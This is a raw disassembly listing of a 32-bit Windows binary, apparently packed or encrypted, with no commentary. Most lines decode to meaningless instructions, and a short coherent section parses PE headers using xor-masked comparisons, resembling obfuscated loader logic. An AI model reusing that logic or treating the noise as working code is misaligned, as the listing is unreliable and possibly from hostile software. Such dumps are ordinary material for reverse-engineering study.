  40290d:	es xchg esp,eax
  40290f:	and    eax,DWORD PTR [edi-0x21]
  402912:	add    al,al
  402914:	mov    edx,DWORD PTR [edx+0x51d93067]
  40291a:	lahf   
  40291b:	jnp    0x402946
  40291d:	stos   DWORD PTR es:[edi],eax
  40291e:	pushf  
  40291f:	scas   al,BYTE PTR es:[edi]
  402920:	or     eax,0x6acd4e92
  402925:	call   0x3648:0x4b014462
  40292c:	and    esi,DWORD PTR [ebx+0x27eb11b]
  402932:	in     eax,dx
  402933:	push   ebp
  402934:	sbb    edx,DWORD PTR [edx-0x69]
  402937:	mov    edi,0x85dc2274
  40293c:	and    BYTE PTR [edi],cl
  40293e:	out    0x1a,al
  402940:	push   0x5c74d92f
  402945:	imul   ebx,edi,0xffffffaf
  402948:	sbb    eax,0xfb7f57c0
  40294d:	std    
  40294e:	mov    dl,0x93
  402950:	pushf  
  402951:	sbb    eax,0x3dd51712
  402956:	outs   dx,BYTE PTR ds:[esi]
  402957:	aam    0xdc
  402959:	fs iret 
  40295b:	daa    
  40295c:	add    cl,BYTE PTR [edx-0x15e5f9b9]
  402962:	jo     0x40290b
  402964:	mov    esi,0x59b20ede
  402969:	add    eax,ebx
  40296b:	inc    al
  40296d:	aas    
  40296e:	xor    BYTE PTR [edx-0x6ae72fe4],cl
  402974:	(bad)  
  402975:	or     DWORD PTR [edi+0x7b],esi
  402978:	and    al,0x48
  40297a:	aaa    
  40297b:	or     DWORD PTR [ebx+0x4],esp
  40297e:	mov    al,ds:0x62ae14ad
  402983:	xchg   esi,eax
  402984:	dec    eax
  402985:	leave  
  402986:	(bad)  
  402988:	(bad)  
  402989:	push   edx
  40298a:	sahf   
  40298b:	nop
  40298c:	hlt    
  40298d:	mul    esp
  40298f:	stc    
  402990:	lahf   
  402991:	pop    ecx
  402992:	dec    ecx
  402993:	add    dl,cl
  402995:	inc    esi
  402996:	in     al,0x5e
  402998:	pop    ecx
  402999:	or     eax,0x5ff592c4
  40299e:	popf   
  40299f:	pop    ebp
  4029a0:	cmc    
  4029a1:	jns    0x4029ad
  4029a3:	pop    ss
  4029a4:	lods   al,BYTE PTR ds:[esi]
  4029a5:	push   ss
  4029a6:	pop    eax
  4029a7:	xchg   edi,eax
  4029a8:	in     eax,dx
  4029a9:	bound  esp,QWORD PTR [eax-0x46e06cd2]
  4029af:	mov    es,WORD PTR [ebp-0x1abfcf7a]
  4029b5:	dec    edi
  4029b6:	loope  0x40294c
  4029b8:	dec    ebp
  4029b9:	outs   dx,BYTE PTR ds:[esi]
  4029ba:	rol    BYTE PTR [esi],cl
  4029bc:	ds jl  0x402a1c
  4029bf:	cdq    
  4029c0:	out    0x48,eax
  4029c2:	fnstsw WORD PTR [edx-0x6834e98d]
  4029c8:	daa    
  4029c9:	pop    eax
  4029ca:	in     eax,dx
  4029cb:	repnz fsubp st(6),st
  4029ce:	xchg   BYTE PTR [edx],ah
  4029d0:	out    0xb5,eax
  4029d2:	ja     0x402996
  4029d4:	jmp    0x5a1a:0xafe86e7
  4029db:	aam    0x5b
  4029dd:	xor    eax,0x639941e
  4029e2:	fidivr DWORD PTR [edx+edi*1+0xf]
  4029e6:	cmp    eax,0x4364798f
  4029eb:	add    esi,esi
  4029ed:	add    DWORD PTR [ebx+0x68],esp
  4029f0:	rcl    DWORD PTR [ebx+0x5f],1
  4029f3:	js     0x4029e5
  4029f5:	rcr    BYTE PTR [ecx-0x75],0xa6
  4029f9:	xor    eax,0x321997bd
  4029fe:	adc    al,bh
  402a00:	test   eax,0x52f57ea0
  402a05:	retf   
  402a06:	xor    al,0x31
  402a08:	dec    esp
  402a09:	push   ds
  402a0a:	push   esp
  402a0b:	(bad)  
  402a0c:	loope  0x40299c
  402a0e:	cld    
  402a0f:	lods   eax,DWORD PTR ds:[esi]
  402a10:	mov    fs,WORD PTR [ecx+0x621c0f0]
  402a16:	jne    0x402a2d
  402a18:	mov    ebp,0xe360e349
  402a1d:	es test eax,0x414b3463
  402a23:	leave  
  402a24:	add    eax,0x645e153c
  402a29:	jg     0x402a26
  402a2b:	out    dx,al
  402a2c:	mov    edx,0x2a0dd643
  402a31:	test   DWORD PTR [ebx-0x25],esp
  402a34:	outs   dx,DWORD PTR ds:[esi]
  402a35:	inc    ebp
  402a36:	mov    edi,0x8966e3cd
  402a3b:	adc    eax,0xc49b14b8
  402a40:	cs mov eax,0x3f1c2d8b
  402a46:	test   eax,0x810fc025
  402a4b:	or     al,0x50
  402a4d:	pop    edi
  402a4e:	adc    ah,BYTE PTR [eiz*8+0x2b352bfe]
  402a55:	int3   
  402a56:	push   ss
  402a57:	push   0xdb7f2083
  402a5c:	aaa    
  402a5d:	cwde   
  402a5e:	ror    DWORD PTR [eax+0x5703dc31],cl
  402a64:	repz mov dl,BYTE PTR [esi-0x80]
  402a68:	cmp    al,BYTE PTR [eax+0x4a]
  402a6b:	push   0xadc3a322
  402a70:	mov    edi,0x8f191726
  402a75:	jecxz  0x402ae4
  402a77:	leave  
  402a78:	inc    edi
  402a79:	sub    al,BYTE PTR [eax+eiz*4-0x45a4b971]
  402a80:	push   ds
  402a81:	enter  0xad6b,0xcf
  402a85:	das    
  402a86:	loopne 0x402a69
  402a88:	test   eax,0xaa070b3a
  402a8d:	xchg   ebp,eax
  402a8e:	push   ss
  402a8f:	jecxz  0x402a47
  402a91:	push   ss
  402a92:	cwde   
  402a93:	shr    BYTE PTR [ecx+eax*8+0x5],1
  402a97:	cmc    
  402a98:	ret    
  402a99:	mov    esi,0xe99ed4dc
  402a9e:	adc    eax,0xccd0405
  402aa3:	pop    esp
  402aa4:	stc    
  402aa5:	pop    eax
  402aa6:	rcr    DWORD PTR [ebp-0x48735390],cl
  402aac:	jg     0x402af6
  402aae:	mov    cl,0xdd
  402ab0:	enter  0x5787,0x15
  402ab4:	xchg   DWORD PTR [esi+0x30],esi
  402ab7:	ins    BYTE PTR es:[edi],dx
  402ab8:	and    esi,0x5a66ecf8
  402abe:	pusha  
  402abf:	inc    edx
  402ac0:	ja     0x402ae7
  402ac2:	cmp    al,0xdc
  402ac4:	cdq    
  402ac5:	inc    cx
  402ac7:	and    dl,BYTE PTR [ebx]
  402ac9:	mov    ch,0xf0
  402acb:	pop    ebp
  402acc:	aas    
  402acd:	in     eax,dx
  402ace:	adc    BYTE PTR [esi-0x45],al
  402ad1:	mov    ds:0x3eb42b60,eax
  402ad6:	or     dh,dh
  402ad8:	push   0x36
  402ada:	(bad)  
  402adb:	rcl    BYTE PTR [eax+0x7f],1
  402ade:	dec    esp
  402adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ae0:	dec    edi
  402ae1:	pop    ebp
  402ae2:	ins    BYTE PTR es:[edi],dx
  402ae3:	lahf   
  402ae4:	add    BYTE PTR [edx],bl
  402ae6:	fs pop esi
  402ae8:	cmp    DWORD PTR [ebp+0x9fb1dee],esp
  402aee:	inc    edx
  402aef:	lds    bp,DWORD PTR ds:0xf502d335
  402af6:	int3   
  402af7:	int    0xf
  402af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402afa:	(bad)  
  402afb:	and    esi,ebx
  402afd:	dec    ecx
  402afe:	rcl    ah,cl
  402b00:	fiadd  DWORD PTR [eax+0x46]
  402b03:	inc    ebx
  402b04:	fst    DWORD PTR [edx-0x58]
  402b07:	add    al,0x90
  402b09:	loope  0x402b85
  402b0b:	dec    ebp
  402b0c:	and    bl,BYTE PTR [ebp-0x16]
  402b0f:	dec    esp
  402b10:	aaa    
  402b11:	mov    esp,0x7e1f2411
  402b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b17:	dec    esi
  402b18:	ret    0x9aa0
  402b1b:	fimul  WORD PTR [edi]
  402b1d:	mov    eax,ds:0x208aaf71
  402b22:	shl    DWORD PTR ds:[eax-0x5cf7d138],0x44
  402b2a:	arpl   di,si
  402b2c:	and    eax,0x46c0fda5
  402b31:	mov    al,ds:0xe6825ab
  402b36:	lods   al,BYTE PTR ds:[esi]
  402b37:	push   ds
  402b38:	daa    
  402b39:	sub    eax,0xeae1f692
  402b3e:	xor    DWORD PTR [ebp+0x30501032],ebx
  402b44:	icebp  
  402b45:	sbb    eax,0xd325095
  402b4a:	mov    ds:0x17cd028c,al
  402b4f:	push   ss
  402b50:	das    
  402b51:	daa    
  402b52:	and    ebp,esp
  402b54:	and    eax,DWORD PTR [ebx-0x43]
  402b57:	addr16 cwde 
  402b59:	adc    eax,0xde5c3a13
  402b5e:	std    
  402b5f:	push   ss
  402b60:	xchg   BYTE PTR [edx],ah
  402b62:	test   DWORD PTR [edi+0x23],esp
  402b65:	sbb    cl,BYTE PTR cs:[ebp-0x39]
  402b69:	mov    ecx,ss
  402b6b:	push   ss
  402b6c:	test   eax,0xac208e94
  402b71:	das    
  402b72:	or     al,BYTE PTR [ebp+0x4d39004f]
  402b78:	push   ecx
  402b79:	mov    eax,ds:0x599e7bf4
  402b7e:	sbb    eax,DWORD PTR [ecx+0x76]
  402b81:	pcmpeqb mm2,mm5
  402b84:	xchg   edi,eax
  402b85:	xchg   esp,eax
  402b86:	call   0x86b4c7c8
  402b8b:	mov    edx,0xc1016c36
  402b90:	mov    edi,0x198ec52
  402b95:	or     al,0x17
  402b97:	je     0x402bf1
  402b99:	and    al,0x93
  402b9b:	mov    esi,0xd8a50b3c
  402ba0:	and    ebx,esi
  402ba2:	outs   dx,DWORD PTR ds:[esi]
  402ba3:	arpl   di,si
  402ba5:	pop    ebx
  402ba6:	pushf  
  402ba7:	add    eax,0x7b9b5b1f
  402bac:	cmp    eax,esp
  402bae:	or     ah,BYTE PTR [eax+0x1e86249d]
  402bb4:	mov    esi,0x72b7f835
  402bb9:	int3   
  402bba:	sbb    DWORD PTR [edi],0x6a081b47
  402bc0:	pop    ecx
  402bc1:	mov    dh,0xf
  402bc3:	es shr DWORD PTR ds:[edi-0x2add1c6d],1
  402bcb:	in     eax,0xe
  402bcd:	xor    edx,DWORD PTR [esi]
  402bcf:	dec    edi
  402bd0:	cmp    BYTE PTR [edi-0x4c],dl
  402bd3:	sub    al,0x30
  402bd5:	ins    BYTE PTR es:[edi],dx
  402bd6:	mov    eax,DWORD PTR [eax+0x3c]
  402bd9:	lea    ecx,[ecx*8+0x78]
  402be0:	add    eax,ecx
  402be2:	mov    ecx,DWORD PTR [ebp-0x8]
  402be5:	mov    ecx,DWORD PTR [ecx]
  402be7:	mov    eax,DWORD PTR [eax+ecx*1]
  402bea:	mov    DWORD PTR [ebp-0x1c],eax
  402bed:	mov    eax,DWORD PTR [ebp+0x8]
  402bf0:	xor    eax,esi
  402bf2:	add    eax,edi
  402bf4:	mov    DWORD PTR [ebp-0x20],eax
  402bf7:	mov    eax,DWORD PTR [ebp+0x8]
  402bfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  402bfd:	xor    eax,esi
  402bff:	add    eax,edi
  402c01:	cmp    ecx,eax
  402c03:	je     0x402f69
  402c09:	mov    eax,DWORD PTR [ebp-0x8]
  402c0c:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c0f:	add    ecx,DWORD PTR [eax]
  402c11:	mov    DWORD PTR [ebp-0x20],ecx
  402c14:	mov    eax,DWORD PTR [ebp-0x20]
  402c17:	mov    ecx,DWORD PTR [ebp-0x8]
  402c1a:	mov    eax,DWORD PTR [eax+0xc]
  402c1d:	mov    ecx,DWORD PTR [ecx]
  402c1f:	mov    al,BYTE PTR [eax+ecx*1]
  402c22:	add    al,0x39
  402c24:	xor    al,0x45
  402c26:	cmp    al,0xc1
  402c28:	je     0x402c3f
  402c2e:	mov    eax,DWORD PTR [ebp+0x8]
  402c31:	mov    ecx,DWORD PTR [ebp-0x8]
  402c34:	xor    eax,esi
  402c36:	add    eax,edi
  402c38:	mov    DWORD PTR [ecx],eax
  402c3a:	jmp    0x402f69
  402c3f:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  402c46:	jmp    0x402f69
  402c4b:	mov    eax,DWORD PTR [ebp-0x8]
  402c4e:	mov    ecx,DWORD PTR [ebp-0x18]
  402c51:	mov    ecx,DWORD PTR [ecx]
  402c53:	mov    DWORD PTR [eax],ecx
  402c55:	mov    eax,DWORD PTR [ebp+0xc]
  402c58:	mov    eax,DWORD PTR [ebp+0x8]
  402c5b:	jmp    0x402f61
  402c60:	add    al,0x8f
  402c62:	and    ecx,0xffffff93
  402c65:	std    
  402c66:	bound  ebp,QWORD PTR [ecx-0x45]
  402c69:	or     DWORD PTR [edi+0x5d],eax
  402c6c:	lahf   
  402c6d:	fwait
  402c6e:	pop    es
  402c6f:	out    dx,eax
  402c70:	les    edx,FWORD PTR ds:0x7e677c7c
  402c76:	jl     0x402cf4
  402c78:	adc    al,0x76
  402c7a:	pop    esi
  402c7b:	iret   
  402c7c:	es pmullw mm2,mm4
  402c80:	aas    
  402c81:	push   0x1750f9f5
  402c86:	cmp    ebx,DWORD PTR [ebx-0x2f338011]
  402c8c:	mov    esp,0x241e2803
  402c91:	jb     0x402c5e
  402c93:	pop    esi
  402c94:	iret   
  402c95:	dec    ecx
  402c96:	mov    BYTE PTR [ebp-0x6],bl
  402c99:	gs (bad) 
  402c9b:	jle    0x402d05
  402c9d:	jbe    0x402ca5
  402c9f:	mov    esi,edx
  402ca1:	jnp    0x402cee
  402ca3:	mov    eax,0xaeee72c4
  402ca8:	mov    BYTE PTR [edx+eax*4],bh
  402cab:	cmp    ebp,DWORD PTR [esi+eax*8+0x52b75c36]
  402cb2:	test   BYTE PTR [ebp-0x35],bh
  402cb5:	cdq    
  402cb6:	xchg   ebx,eax
  402cb7:	jne    0x402d21
  402cb9:	xlat   BYTE PTR ds:[ebx]
  402cba:	(bad)  
  402cbb:	mov    ch,bl
  402cbd:	out    dx,eax
  402cbe:	shl    DWORD PTR [ebp+0x7],cl
  402cc1:	repz rol BYTE PTR [ebx],0x98
  402cc5:	pusha  
  402cc6:	mov    ds:0x474b3fb,eax
  402ccb:	fcomip st,st(5)
  402ccd:	mov    ebx,0xb9def837
  402cd2:	mov    al,BYTE PTR [edi+0x20a06644]
  402cd8:	mov    esp,0x62ba2cfb
  402cdd:	add    esp,DWORD PTR [ecx+esi*8]
  402ce0:	mov    eax,ds:0x43858158
  402ce5:	fild   WORD PTR [ebp+0x30]
  402ce8:	mov    ds:0x1a7c358b,eax
  402ced:	dec    eax
  402cee:	cli    
  402cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cf0:	jmp    0xc0fa:0xf61fea8e
  402cf7:	mov    ah,0xcb
  402cf9:	dec    eax
  402cfa:	icebp  
  402cfb:	push   ds
  402cfc:	mov    eax,fs:0x90df3c91
  402d02:	lds    ebp,FWORD PTR [esi-0x413c04e4]
  402d08:	mov    al,0xbd
  402d0a:	inc    ecx
  402d0b:	out    dx,al
  402d0c:	jl     0x402d8c
  402d0e:	push   edx
  402d0f:	adc    DWORD PTR [ecx-0x341040de],eax
  402d15:	fwait
  402d16:	pop    ecx
  402d17:	pop    ecx
  402d18:	rcl    DWORD PTR [ecx-0x72],1
  402d1b:	sbb    DWORD PTR [esi+0x6b],ebp
  402d1e:	leave  
  402d1f:	neg    BYTE PTR [ebx]
  402d21:	dec    eax
  402d22:	push   edx
  402d23:	inc    esp
  402d24:	dec    ecx
  402d25:	push   es
  402d26:	shr    BYTE PTR [esi+0x72],1
  402d29:	mov    esi,DWORD PTR [eax+0x5c4b976]
  402d2f:	scas   al,BYTE PTR es:[edi]
  402d30:	jns    0x402cb7
  402d32:	lahf   
  402d33:	imul   eax,edx,0x47
  402d36:	lods   eax,DWORD PTR ds:[esi]
  402d37:	pusha  
  402d38:	inc    ecx
  402d39:	inc    edi
  402d3a:	adc    al,0xeb
  402d3c:	or     dh,BYTE PTR [edi+0x727c322a]
  402d42:	jmp    0x402dbd
  402d44:	xor    eax,0x491e394e
  402d49:	push   ebx
  402d4a:	lock ins DWORD PTR es:[edi],dx
  402d4c:	or     eax,0xd2aa8eea
  402d51:	repz push ebp
  402d53:	mov    bl,0x6b
  402d55:	mov    al,ds:0x98186f42
  402d5a:	add    eax,0x658382d9
  402d5f:	repz inc eax
  402d61:	mov    eax,ds:0xe4c29c33
  402d66:	addr16 jne 0x402d71
  402d69:	push   es
  402d6a:	pop    esp
  402d6b:	ffree  st(7)
  402d6d:	(bad)  
  402d6e:	outs   dx,DWORD PTR ds:[esi]
  402d6f:	ins    DWORD PTR es:[edi],dx
  402d70:	loope  0x402d1b
  402d72:	jno    0x402cfc
  402d74:	(bad)  
  402d75:	jns    0x402d54
  402d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d78:	sub    eax,0xe64d574c
  402d7d:	sbb    bl,bl
  402d7f:	sbb    BYTE PTR [edx-0x4c],cl
  402d82:	sub    DWORD PTR [ebx],eax
  402d84:	aas    
  402d85:	fsub   st(5),st
  402d87:	(bad)  
  402d88:	cdq    
  402d89:	cmp    eax,0x1be09daf
  402d8e:	pop    edx
  402d8f:	aam    0xd2
  402d91:	in     al,0x39
  402d93:	cmp    ch,BYTE PTR [ebx-0x5f7c9a5e]
  402d99:	add    eax,edx
  402d9b:	mov    eax,ds:0xf86a0aaf
  402da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402da1:	cmp    eax,0x410b9220
  402da6:	pop    ss
  402da7:	mov    ah,dl
  402da9:	neg    BYTE PTR [ebx]
  402dab:	jne    0x402dcc
  402dad:	fcom   DWORD PTR [ebp+ecx*2-0x61]
  402db1:	fsubr  QWORD PTR [esi+0x47d35e51]
  402db7:	sbb    cl,BYTE PTR [ebp+0x26]
  402dba:	mov    edi,0x407590a0
  402dbf:	or     eax,0x909d172e
  402dc4:	leave  
  402dc5:	jmp    0xa65e:0xa4d597c0
  402dcc:	pop    ss
  402dcd:	cmp    eax,0x93513df6
  402dd2:	bound  eax,QWORD PTR [edx+0xe]
  402dd5:	jle    0x402dbe
  402dd7:	pusha  
  402dd8:	imul   BYTE PTR [edx-0x6c]
  402ddb:	sar    BYTE PTR ds:0xef8aa10a,1
  402de1:	jns    0x402e19
  402de3:	cmc    
  402de4:	jmp    0x5bd223ca
  402de9:	push   ds
  402dea:	out    0x7c,al
  402dec:	cmp    eax,0xb189e8e3
  402df1:	and    al,0xa2
  402df3:	or     eax,0xd6566457
  402df8:	mov    ecx,0x2a4938b5
  402dfd:	retf   
  402dfe:	sub    eax,0x601ab79
  402e03:	inc    ebp
  402e04:	and    BYTE PTR [eax],al
  402e06:	sub    DWORD PTR [eax+0x29de5819],ebp
  402e0c:	jns    0x402dfc
  402e0e:	mov    bh,0x72
  402e10:	mov    esp,0xbeb8dc3
  402e15:	fnstsw WORD PTR [edi-0x53]
  402e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e19:	inc    edi
  402e1a:	xor    BYTE PTR [esi],cl
  402e1c:	xchg   edx,eax
  402e1d:	pusha  
  402e1e:	(bad)  
  402e1f:	cmp    DWORD PTR [esi],eax
  402e21:	fld    TBYTE PTR [ebx-0x52]
  402e24:	push   0x30
  402e26:	jbe    0x402dae
  402e28:	fidiv  WORD PTR [ebp+0x7e]
  402e2b:	xchg   ebp,eax
  402e2c:	aam    0x34
  402e2e:	out    0xa6,al
  402e30:	je     0x402e26
  402e32:	dec    ebx
  402e33:	add    eax,0x56ed4d49
  402e38:	mov    dh,0x21
  402e3a:	outs   dx,DWORD PTR ds:[esi]
  402e3b:	ficom  WORD PTR ds:0x1672fb6b
  402e41:	mov    esi,DWORD PTR [ebx+0x3b]
  402e44:	sar    BYTE PTR [ebx-0x71],1
  402e47:	mov    ds,WORD PTR [ecx-0x225e67a0]
  402e4d:	push   esi
  402e4e:	fnstcw WORD PTR [ebx]
  402e50:	jbe    0x402e94
  402e52:	mul    BYTE PTR [ebx+0x1f]
  402e55:	sbb    DWORD PTR [ebx-0x25c6e28c],edx
  402e5b:	scas   eax,DWORD PTR es:[edi]
  402e5c:	retf   
  402e5d:	retf   
  402e5e:	addr16 sbb eax,ebp
  402e61:	leave  
  402e62:	ja     0x402e18
  402e64:	or     ecx,DWORD PTR [esi+ebp*1]
  402e67:	gs imul eax,eax,0xffffff83
  402e6b:	adc    edi,ebp
  402e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e6e:	xchg   DWORD PTR [edx-0x8beee7a],esp
  402e74:	or     ah,ah
  402e76:	psrlq  mm6,QWORD PTR [ecx-0x18]
  402e7a:	xchg   esp,eax
  402e7b:	arpl   WORD PTR [eax],cx
  402e7d:	xor    BYTE PTR [edi],dh
  402e7f:	add    dh,ch
  402e81:	jp     0x402e5b
  402e83:	ds stos BYTE PTR es:[edi],al
  402e85:	retf   
  402e86:	cmp    dh,dh
  402e88:	test   DWORD PTR [edx],esi
  402e8a:	popf   
  402e8b:	lods   eax,DWORD PTR ds:[esi]
  402e8c:	xor    eax,0xf81a67e9
  402e91:	stos   DWORD PTR es:[edi],eax
  402e92:	mov    ch,0x9a
  402e94:	pop    es
  402e95:	repnz (bad) 
  402e98:	aas    
  402e99:	cld    
  402e9a:	retf   
  402e9b:	or     ecx,DWORD PTR [ecx+0x6e85795]
  402ea1:	cld    
  402ea2:	clc    
  402ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea4:	push   esi
  402ea5:	xchg   edi,eax
  402ea6:	cmp    al,0xb0
  402ea8:	in     eax,dx
  402ea9:	aad    0x8e
  402eab:	(bad)  
  402eac:	jno    0x402ecb
  402eae:	test   DWORD PTR [ebp+0x484edf18],ecx
  402eb4:	aaa    
  402eb5:	cmp    eax,0xc25bf100
  402eba:	ins    DWORD PTR es:[edi],dx
  402ebb:	call   0x1e3f2251
  402ec0:	push   esp
  402ec1:	add    eax,0xff6f95f5
  402ec6:	sub    DWORD PTR [ecx],esp
  402ec8:	inc    esp
  402ec9:	scas   al,BYTE PTR es:[edi]
  402eca:	jmp    0x6b1a:0x51075423
  402ed1:	leave  
  402ed2:	add    al,BYTE PTR [ecx]
  402ed4:	ret    0x59f8
  402ed7:	mov    ?,WORD PTR [ecx-0x7ebc0845]
  402edd:	popf   
  402ede:	in     al,dx
  402edf:	or     al,0xa8
  402ee1:	call   eax
  402ee3:	cmp    DWORD PTR [eax],0x5c
  402ee6:	xchg   ecx,eax
  402ee7:	jle    0x402f62
  402ee9:	mov    ds:0x6ee6158d,eax
  402eee:	ins    DWORD PTR es:[edi],dx
  402eef:	ret    0x8613
  402ef2:	(bad)
  402ef5:	jne    0x402ee1
  402ef7:	pop    edx
  402ef8:	arpl   WORD PTR [eax-0x15b4a5b8],bx
  402efe:	(bad)  
  402eff:	aam    0xaf
  402f01:	mov    WORD PTR [ebx-0x368e6f8a],ds
  402f07:	adc    dh,0xa3
  402f0a:	adc    eax,0xac2e97dc
  402f0f:	or     eax,0xa6a13534
  402f14:	nop
  402f15:	ret    
  402f16:	icebp  
  402f17:	mov    eax,ds:0x86898bef
  402f1c:	or     DWORD PTR [ebp+0x12d06aaf],ebp
  402f22:	stc    
  402f23:	mov    ebp,0xd038818a
  402f28:	mov    edi,0x432e142f
  402f2d:	dec    edi
  402f2e:	arpl   WORD PTR [edx],cx
  402f30:	mov    eax,0x310bc696
  402f35:	cmp    eax,0x8720acf3
  402f3a:	rcl    BYTE PTR [edx-0x496b3b79],0xe1
  402f41:	jbe    0x402eed
  402f43:	or     edx,DWORD PTR [ebx]
  402f45:	fidivr DWORD PTR [ebp-0x7fd27d41]
  402f4b:	xor    eax,0xe48d8448
  402f50:	push   edx
  402f51:	jg     0x402f91
  402f53:	inc    edx
  402f54:	add    eax,0x1ca97cc2
  402f59:	jmp    0x1aba46b2
  402f5e:	jl     0x402f91
  402f60:	aaa    
  402f61:	push   DWORD PTR [ebp-0x8]
  402f64:	call   0x4062cd
  402f69:	mov    eax,DWORD PTR [ebp-0xc]
  402f6c:	cmp    eax,ebx
  402f6e:	je     0x401817
  402f74:	mov    eax,DWORD PTR [ebp-0x8]
  402f77:	mov    eax,DWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	pop    esi
  402f7b:	jmp    0x403281
  402f80:	imul   ebx,DWORD PTR [eax],0x54
  402f83:	cmc    
  402f84:	push   edi
  402f85:	jge    0x403004
  402f87:	call   0x6ec1:0x1360eb95
  402f8e:	daa    
  402f8f:	adc    DWORD PTR [edi],ebp
  402f91:	push   ss
  402f92:	jl     0x403010
  402f94:	addr16 jle 0x403013
  402f97:	jl     0x402f90
  402f99:	or     esi,DWORD PTR [ecx]
  402f9b:	retf   
  402f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f9d:	pop    esp
  402f9e:	ret    
  402f9f:	idiv   DWORD PTR [edx]
  402fa1:	sahf   
  402fa2:	rcl    DWORD PTR [ebx+0x6c],cl
  402fa5:	loop   0x402fdb
  402fa7:	inc    esp
  402fa8:	mov    ch,0x5e
  402faa:	xor    edi,DWORD PTR [ebx]
  402fac:	fnstsw WORD PTR [edx+0x29ae37d2]
  402fb2:	imul   DWORD PTR [edi+ebp*8-0x27]
  402fb6:	psubusw mm6,QWORD PTR [edi]
  402fb9:	stos   DWORD PTR es:[edi],eax
  402fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fbb:	jne    0x403005
  402fbd:	jmp    0x402f72
  402fbf:	test   DWORD PTR [edx-0x60],edi
  402fc2:	jp     0x402fe8
  402fc4:	pop    edi
  402fc5:	mov    al,ds:0x5f5b80b2
  402fca:	shl    DWORD PTR [ebp+0x19],0xce
  402fce:	push   ecx
  402fcf:	call   0x15eb:0xc88f134c
  402fd6:	loop   0x402fa2
  402fd8:	jne    0x403044
  402fda:	(bad)  
  402fdb:	cld    
  402fdc:	jns    0x403022
  402fde:	ins    BYTE PTR es:[edi],dx
  402fdf:	int    0xdd
  402fe1:	xchg   edi,eax
  402fe2:	mov    ch,0x61
  402fe4:	fcom   DWORD PTR [ebx+0x3]
  402fe7:	xor    eax,0x8ccae164
  402fec:	mov    dh,0x79
  402fee:	data16 lahf 
  402ff0:	ret    0x4d33
  402ff3:	popa   
  402ff4:	lds    eax,FWORD PTR [ebp+edi*2+0x6db92931]
  402ffb:	dec    ebp
  402ffc:	loop   0x402fea
  402ffe:	cwde   
  402fff:	test   edi,0x2cf73a53
  403005:	or     eax,0x5c5f7f51
  40300a:	mov    bh,0xd9
  40300c:	pop    edi
  40300d:	pushf  
  40300e:	int3   
  40300f:	sbb    eax,0xd35d85d7
  403014:	(bad)
  403018:	push   0x15d6d399
  40301d:	xchg   ecx,eax
  40301e:	ret    
  40301f:	push   esp
  403020:	or     bh,bh
  403022:	or     edi,DWORD PTR [ebx]
  403024:	push   ds
  403025:	ror    edx,1
  403027:	imul   ecx,DWORD PTR [esi+ebp*4+0x52],0xe6e8f0e4
  40302f:	dec    ebp
  403030:	push   cs
  403031:	mov    esp,0xbdaf789
  403036:	retf   0xdee3
  403039:	add    ebx,DWORD PTR [edi-0x7b]
  40303c:	mov    al,ds:0x313cce0a
  403041:	inc    ecx
  403042:	cmp    eax,0x6fa48460
  403047:	jo     0x403074
  403049:	mov    ch,0x9f
  40304b:	rsqrtps xmm7,XMMWORD PTR [edi]
  40304e:	or     cl,BYTE PTR [ecx+eiz*1]
  403051:	push   0x249cd869
  403056:	clc    
  403057:	test   BYTE PTR [ecx-0x5feb1ef8],dh
  40305d:	jmp    0x2fc2:0x99bb80c9
  403064:	push   es
  403065:	fcom   st(3)
  403067:	xor    al,0x38
  403069:	xchg   ecx,eax
  40306a:	push   cs
  40306b:	cmp    BYTE PTR ds:0x8a4de6b6,0x90
  403072:	push   edi
  403073:	test   BYTE PTR [edx],dl
  403075:	pavgb  mm3,mm7
  403078:	test   al,0x6b
  40307a:	jmp    0x110e:0xecf7ebaa
  403081:	icebp  
  403082:	scas   al,BYTE PTR es:[edi]
  403083:	add    bl,BYTE PTR [edi-0x47]
  403086:	jle    0x40307b
  403088:	int    0x56
  40308a:	or     bh,BYTE PTR [esi-0x7e]
  40308d:	rcl    cl,cl
  40308f:	imul   ebx,DWORD PTR [esi],0xbcc1ccc3
  403095:	xor    eax,0xa4d586a6
  40309a:	pop    edx
  40309b:	inc    ecx
  40309c:	aad    0x31
  40309e:	pusha  
  40309f:	push   ds
  4030a0:	mov    al,ds:0x274e447d
  4030a5:	in     al,dx
  4030a6:	sub    al,0xed
  4030a8:	in     al,0x8
  4030aa:	xchg   ebp,eax
  4030ab:	xchg   BYTE PTR [eax+0x4d933267],bl
  4030b1:	xchg   BYTE PTR [ebx+0x2],dh
  4030b4:	adc    esp,DWORD PTR [esp+ebx*1-0x19743b66]
  4030bb:	or     eax,0x7f290677
  4030c0:	cld    
  4030c1:	cmp    al,0x36
  4030c3:	repz push cs
  4030c5:	adc    DWORD PTR [edi-0x6c3345b8],esi
  4030cb:	and    eax,DWORD PTR [ebx-0x195dc0bf]
  4030d1:	inc    ecx
  4030d2:	ds addr16 retf 
  4030d5:	xchg   esi,eax
  4030d6:	icebp  
  4030d7:	jns    0x40307f
  4030d9:	mov    ds:0x757f37a,eax
  4030de:	scas   eax,DWORD PTR es:[edi]
  4030df:	loope  0x403099
  4030e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030e2:	mov    dl,0x30
  4030e4:	sub    al,0x75
  4030e6:	dec    eax
  4030e7:	add    DWORD PTR [ebp-0x7b712b41],ebx
  4030ed:	or     dl,dh
  4030ef:	push   0x1698ca8d
  4030f4:	dec    esi
  4030f5:	pop    eax
  4030f6:	and    bl,al
  4030f8:	mov    dh,0x23
  4030fa:	dec    ebp
  4030fb:	lahf   
  4030fc:	push   eax
  4030fd:	mov    ebx,0xc87e07c2
  403102:	adc    BYTE PTR [ebp+0x10f23b1b],cl
